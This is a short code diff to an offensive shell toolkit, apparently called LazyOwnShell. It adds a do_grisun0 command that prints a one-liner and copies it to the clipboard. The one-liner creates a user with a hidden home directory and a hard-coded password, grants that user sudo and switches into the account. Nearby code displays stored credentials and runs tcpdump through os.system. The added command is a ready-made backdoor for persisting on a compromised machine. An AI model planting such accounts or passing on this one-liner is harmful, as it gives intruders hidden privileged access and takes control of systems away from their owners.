@@ -2741,6 +2741,7 @@ class LazyOwnShell(Cmd):
         decoded_string = decode(input_string, shift_value, substitution_key)
         print_msg(f"Decoded string: {decoded_string}")
         return
+        
     def do_creds(self, line):
         """
         Display the credentials stored in the `credentials.txt` file and copy the password to the clipboard.
@@ -3064,6 +3065,13 @@ class LazyOwnShell(Cmd):
             return
         print_msg(f"{WHITE}sudo tcpdump -i {GREEN}{line}{WHITE}{CYAN} icmp -n{RESET} ")
         os.system(f"sudo tcpdump -i {line} icmp -n")
+        return
+
+    def do_grisun0(self, line):
+        """useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0"""
+        print_msg(f"{WHITE}useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0{RESET} ")
+        os.system(f"echo \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0\" | xclip -sel clip")
+        print_warn("Copied to clip ;)")
         return
 
     def do_winbase64payload(self, line):
